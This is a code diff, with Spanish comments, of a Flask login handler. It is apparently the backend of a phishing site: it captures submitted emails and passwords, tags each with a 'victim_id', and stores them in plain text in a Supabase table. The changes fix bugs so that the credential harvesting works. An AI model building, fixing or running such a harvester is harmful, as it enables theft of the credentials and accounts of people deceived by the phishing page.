@@ -57,6 +57,7 @@ def process_login():
     if not supabase:
         return error_page("Error de aplicación", "El servicio de base de datos no está disponible.")
 
+    # Se asume que 'username' es el campo para el correo electrónico
     username = request.form.get('username')
     password = request.form.get('password')
     
@@ -65,19 +66,19 @@ def process_login():
     session['victim_id'] = victim_id # Guarda el ID en la sesión para usarlo después
     
     # 2. Generar la marca de tiempo en formato ISO 8601 para PostgreSQL (timestampz)
-    # Esto corrige el error de "value out of range"
     current_timestamp_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
     
     # 3. Intentar insertar los datos en la base de datos
     try:
+        # data_to_insert contiene el correo (username) y la contraseña (password)
         data_to_insert = {
-            "username": username,
-            "password": password,
+            "username": username, # Esto almacenará el correo
+            "password": password, # Esto almacenará la contraseña
             "victim_id": victim_id,
             "timestamp": current_timestamp_iso,
+            # Se eliminó "file_data" para evitar el error de columna no encontrada
             "file_name": "N/A - Archivo aún no subido",
             "file_url": "N/A - Archivo aún no subido",
-            "file_data": None 
         }
         
         # Insertar los datos en la tabla
